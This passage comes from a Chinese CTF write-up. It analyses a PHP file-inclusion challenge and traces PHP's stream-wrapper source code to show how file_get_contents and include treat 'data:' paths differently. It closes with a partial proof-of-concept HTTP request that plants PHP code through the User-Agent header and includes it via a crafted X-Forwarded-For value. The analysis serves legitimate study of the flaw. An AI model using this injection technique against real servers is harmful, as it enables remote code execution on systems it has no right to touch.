invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这次不会让你得逞了！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再想想?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Warning: <span class="title function_ invoke__">chdir</span>(): No such file <span class="keyword">or</span> <span class="title function_ invoke__">directory</span> (errno <span class="number">2</span>) in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">11</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">file_get_contents</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">21</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">file_get_contents</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">21</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">25</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(): Failed opening <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> <span class="title function_ invoke__">inclusion</span> (include_path=<span class="string">&#x27;.:/usr/local/lib/php&#x27;</span>) in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>从代码来看我们可以知道，定义了一个<code>$mkdir</code>函数会进行创建目录，首先是在当前工作目录创建一个<code>users/[random_bytes(16)]</code>目录并移动工作目录到该目录，随后会尝试获取到<code>HTTP_X_FORWARDED_FOR</code>，也就是请求头中的XFF头作为目录名，如果为空或没有就会获取<code>REMOTE_ADDR</code>，创建目录后继续进入该目录并将<code>$_SERVER</code>全局变量写入profile文件，最后返回上级目录</p>
<p>从上面的信息我们可以得出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前最终工作目录是在/<span class="keyword">var</span>/www/html/users/[<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)]</span><br><span class="line">而profile文件在/<span class="keyword">var</span>/www/html/users/[<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)]/<span class="title function_ invoke__">X_FORWARDED_FOR</span>(REMOTE_ADDR)目录下</span><br></pre></td></tr></table></figure>

<p>那我们也知道全局变量中是包含UA头的，那么可以尝试在UA头写马进profile，但是如何进行包含呢？</p>
<p>这里的话有file_get_contents函数对文件内容进行检测，随后才会进行include包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这次不会让你得逞了！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再想想?&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ok，接下来进入正题</p>
<h3 id="include和file-get-content处理协议的区别"><a href="#include和file-get-content处理协议的区别" class="headerlink" title="include和file_get_content处理协议的区别"></a>include和file_get_content处理协议的区别</h3><p>在讲这个内容之前，我们需要了解一下file_get_content的源码实现</p>
<h4 id="file-get-content的源码实现"><a href="#file-get-content的源码实现" class="headerlink" title="file_get_content的源码实现"></a>file_get_content的源码实现</h4><p>在 PHP 源码里，<code>file_get_contents</code> 定义在 <strong>ext&#x2F;standard&#x2F;file.c</strong>，直接去github下载到本地看吧</p>
<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.3.6/ext/standard/file.c">https://github.com/php/php-src/blob/PHP-7.3.6/ext/standard/file.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(file_get_contents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *filename;</span><br><span class="line">	<span class="type">size_t</span> filename_len;</span><br><span class="line">	zend_bool use_include_path = <span class="number">0</span>;</span><br><span class="line">	php_stream *stream;</span><br><span class="line">	zend_long offset = <span class="number">0</span>;</span><br><span class="line">	zend_long maxlen = (<span class="type">ssize_t</span>) PHP_STREAM_COPY_ALL;</span><br><span class="line">	zval *zcontext = <span class="literal">NULL</span>;</span><br><span class="line">	php_stream_context *context = <span class="literal">NULL</span>;</span><br><span class="line">	zend_string *contents;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Parse arguments */</span></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">		Z_PARAM_PATH(filename, filename_len)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span class="line">		<span class="title function_">Z_PARAM_BOOL</span><span class="params">(use_include_path)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_RESOURCE_EX</span><span class="params">(zcontext, <span class="number">1</span>, <span class="number">0</span>)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(offset)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(maxlen)</span></span><br><span class="line">	<span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ZEND_NUM_ARGS() == <span class="number">5</span> &amp;&amp; maxlen &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;length must be greater than or equal to zero&quot;</span>);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	context = php_stream_context_from_zval(zcontext, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span>,</span><br><span class="line">				(use_include_path ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS,</span><br><span class="line">				<span class="literal">NULL</span>, context);</span><br><span class="line">	<span class="keyword">if</span> (!stream) &#123;</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset != <span class="number">0</span> &amp;&amp; php_stream_seek(stream, offset, ((offset &gt; <span class="number">0</span>) ? SEEK_SET : SEEK_END)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Failed to seek to position &quot;</span> ZEND_LONG_FMT <span class="string">&quot; in the stream&quot;</span>, offset);</span><br><span class="line">		php_stream_close(stream);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (maxlen &gt; INT_MAX) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;maxlen truncated from &quot;</span> ZEND_LONG_FMT <span class="string">&quot; to %d bytes&quot;</span>, maxlen, INT_MAX);</span><br><span class="line">		maxlen = INT_MAX;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((contents = php_stream_copy_to_mem(stream, maxlen, <span class="number">0</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		RETVAL_STR(contents);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		RETVAL_EMPTY_STRING();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	php_stream_close(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看局部变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *filename;		<span class="comment">//传入的文件路径或url</span></span><br><span class="line"><span class="type">size_t</span> filename_len;	<span class="comment">//文件名长度</span></span><br><span class="line">zend_bool use_include_path = <span class="number">0</span>;		</span><br><span class="line">php_stream *stream;		<span class="comment">//打开的文件或协议流</span></span><br><span class="line">zend_long offset = <span class="number">0</span>;</span><br><span class="line">zend_long maxlen = (<span class="type">ssize_t</span>) PHP_STREAM_COPY_ALL;</span><br><span class="line">zval *zcontext = <span class="literal">NULL</span>;</span><br><span class="line">php_stream_context *context = <span class="literal">NULL</span>;</span><br><span class="line">zend_string *contents;</span><br></pre></td></tr></table></figure>

<p>然后我们看对协议流的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span>,</span><br><span class="line">            (use_include_path ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS,</span><br><span class="line">            <span class="literal">NULL</span>, context);</span><br></pre></td></tr></table></figure>

<p>我们主要看php_stream_open_wrapper_ex 函数，因为这个是处理流包装器的主要逻辑</p>
<p>在main\streams\streams.c中，我们先来看看这个函数中的参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_stream *stream = <span class="literal">NULL</span>;</span><br><span class="line">php_stream_wrapper *wrapper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *path_to_open;</span><br><span class="line"><span class="type">int</span> persistent = options &amp; STREAM_OPEN_PERSISTENT;</span><br><span class="line">zend_string *resolved_path = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span> *copy_of_path = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>其中<code>php_stream_wrapper *wrapper</code>是所选的协议封装对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!path || !*path) &#123;</span><br><span class="line">	php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Filename cannot be empty&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是检查路径合法性，否则抛出报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(path, &amp;path_to_open, options);</span><br></pre></td></tr></table></figure>

<p>这是核心逻辑，分析路径，找到合适的<strong>封装协议对象</strong>，我们跟进php_stream_locate_url_wrapper函数</p>
<p>在同一文件中进行分析找到关键代码</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101195023820.png" alt="image-20251101195023820"></p>
<p>可以看到这里会对<code>data:</code>进行特例的判断，这是因为在RFC 2397定义 <strong>Data URI Scheme</strong> 的技术规范文档中data的规范应该是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>

<p>此时也能匹配到data协议，但是其实<code>data://</code>也是符合规范的</p>
<p>写个demo测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// RFC 2397</span></span><br><span class="line"><span class="variable">$fp1</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data:,test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$meta1</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$meta1</span>[<span class="string">&#x27;wrapper_type&#x27;</span>]; <span class="comment">// RFC2397</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP wrapper</span></span><br><span class="line"><span class="variable">$fp2</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$meta2</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$meta2</span>[<span class="string">&#x27;wrapper_type&#x27;</span>]; <span class="comment">// RFC2397</span></span><br></pre></td></tr></table></figure>

<p>然后我们来看看include的源码</p>
<h4 id="include的源码实现"><a href="#include的源码实现" class="headerlink" title="include的源码实现"></a>include的源码实现</h4><p>在Zend\zend_execute.c中的zend_include_or_eval，这是 PHP Zend 引擎中处理 <strong>include&#x2F;require&#x2F;eval</strong> 的核心函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SUCCESS == zend_stream_open(ZSTR_VAL(resolved_path), &amp;file_handle)) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (!file_handle.opened_path) &#123;</span><br><span class="line">						file_handle.opened_path = zend_string_copy(resolved_path);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (zend_hash_add_empty_element(&amp;EG(included_files), file_handle.opened_path)) &#123;</span><br><span class="line">						zend_op_array *op_array = zend_compile_file(&amp;file_handle, (type==ZEND_INCLUDE_ONCE?ZEND_INCLUDE:ZEND_REQUIRE));</span><br><span class="line">						zend_destroy_file_handle(&amp;file_handle);</span><br><span class="line">						zend_string_release_ex(resolved_path, <span class="number">0</span>);</span><br><span class="line">						<span class="keyword">if</span> (Z_TYPE(tmp_inc_filename) != IS_UNDEF) &#123;</span><br><span class="line">							zval_ptr_dtor_str(&amp;tmp_inc_filename);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">return</span> op_array;</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						zend_file_handle_dtor(&amp;file_handle);</span><br><span class="line">already_compiled:</span><br><span class="line">						new_op_array = ZEND_FAKE_OP_ARRAY;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>

<p>zend_stream_open函数会尝试打开文件，这里是我们的核心，跟进一下</p>
<p>在Zend\zend_stream.c中zend_stream_open</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API <span class="type">int</span> <span class="title function_">zend_stream_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, zend_file_handle *handle)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (zend_stream_open_function) &#123;</span><br><span class="line">        <span class="comment">//如果设置了自定义的打开函数</span></span><br><span class="line">		<span class="keyword">return</span> zend_stream_open_function(filename, handle);</span><br><span class="line">	&#125;</span><br><span class="line">	handle-&gt;type = ZEND_HANDLE_FP;</span><br><span class="line">	handle-&gt;opened_path = <span class="literal">NULL</span>;</span><br><span class="line">	handle-&gt;handle.fp = zend_fopen(filename, &amp;handle-&gt;opened_path);</span><br><span class="line">	handle-&gt;filename = filename;</span><br><span class="line">	handle-&gt;free_filename = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;handle-&gt;handle.stream.mmap, <span class="number">0</span>, <span class="keyword">sizeof</span>(zend_mmap));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (handle-&gt;handle.fp) ? SUCCESS : FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进zend_stream_open_function的值</p>
<p>在PHP 中，<code>zend_stream_open_function</code> 通常在 <strong>SAPI 初始化阶段</strong>被设置</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101234410001.png" alt="image-20251101234410001"></p>
<p>然后同文件下可以找到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_stream_open_function = utility_functions-&gt;stream_open_function;</span><br></pre></td></tr></table></figure>

<p>随后跟进一下utility_functions结构体</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101234958842.png" alt="image-20251101234958842"></p>
<p>然后我们查找哪里利用结构体初始化了这个函数stream_open_function</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101235136654.png" alt="image-20251101235136654"></p>
<p>很明显，最后zend_stream_open_function的值就是<code>php_stream_open_for_zend</code>，所以会调用php_stream_open_for_zend函数，跟进php_stream_open_for_zend函数来到php_stream_open_for_zend_ex函数</p>
<p>里面有一个处理文件流的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_stream *stream = php_stream_open_wrapper((<span class="type">char</span> *)filename, <span class="string">&quot;rb&quot;</span>, mode, &amp;opened_path);</span><br></pre></td></tr></table></figure>

<p>跟进php_stream_open_wrapper来到<code>_php_stream_open_wrapper_ex函数</code>中的zend_resolve_path相关代码段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options &amp; USE_PATH) &#123;</span><br><span class="line">	resolved_path = zend_resolve_path(path, <span class="built_in">strlen</span>(path));</span><br><span class="line">	<span class="keyword">if</span> (resolved_path) &#123;</span><br><span class="line">		path = ZSTR_VAL(resolved_path);</span><br><span class="line">		<span class="comment">/* we&#x27;ve found this file, don&#x27;t re-check include_path or run realpath */</span></span><br><span class="line">		options |= STREAM_ASSUME_REALPATH;</span><br><span class="line">		options &amp;= ~USE_PATH;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (EG(exception)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>这时候肯定会有人疑问，为什么file_get_content和include都会来到<code>_php_stream_open_wrapper_ex</code>函数，但是为什么进入的处理逻辑不一样呢？</p>
<p>让我们把视角回到php_stream_open_for_zend_ex函数中</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102001239686.png" alt="image-20251102001239686"></p>
<p>可以看到多了一个opened_path参数，并且默认是这三个值，反观file_get_content</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102001830074.png" alt="image-20251102001830074"></p>
<p>可以看到如果这里没有值的话就默认是REPORT_ERRORS，否则就是<code>USE_PATH | REPORT_ERRORS</code></p>
<p>所以这也是为什么include最终会进入<code>if (options &amp; USE_PATH) &#123;</code>的情况</p>
</blockquote>
<p>继续跟进<code>zend_resolve_path</code>，一路来到php_resolve_path_for_zend并进入php_resolve_path</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102003229685.png" alt="image-20251102003229685"></p>
<p>这里就是重点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (p = filename; <span class="built_in">isalnum</span>((<span class="type">int</span>)*p) || *p == <span class="string">&#x27;+&#x27;</span> || *p == <span class="string">&#x27;-&#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span>; p++);</span><br><span class="line"><span class="comment">//遍历文件名的字符，识别 URL 协议头，直到遇到不是[a-zA-Z0-9+-.]的字符</span></span><br><span class="line">	<span class="keyword">if</span> ((*p == <span class="string">&#x27;:&#x27;</span>) &amp;&amp; (p - filename &gt; <span class="number">1</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//检测是否是://协议的格式</span></span><br><span class="line">		wrapper = php_stream_locate_url_wrapper(filename, &amp;actual_path, STREAM_OPEN_FOR_INCLUDE);</span><br><span class="line">		<span class="keyword">if</span> (wrapper == &amp;php_plain_files_wrapper) &#123;</span><br><span class="line">			<span class="keyword">if</span> (tsrm_realpath(actual_path, resolved_path)) &#123;</span><br><span class="line">				<span class="keyword">return</span> zend_string_init(resolved_path, <span class="built_in">strlen</span>(resolved_path), <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>很容易就能看到，这里要求协议必须是<code>[协议头]://</code>的格式，这也是跟<code>file_get_contents</code>不同的地方</p>
<p>因此我们可以得出一个结论</p>
<p><strong>file_get_contents函数针对<code>data:</code>协议仍然可以进行解析为data封装协议，而include在遇到<code>data:</code>的格式则会由于格式问题返回NULL</strong></p>
<p>因此可以构造poc</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?page=data:,a/profile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.anna.nssctf.cn:28481</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>data:,a</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: 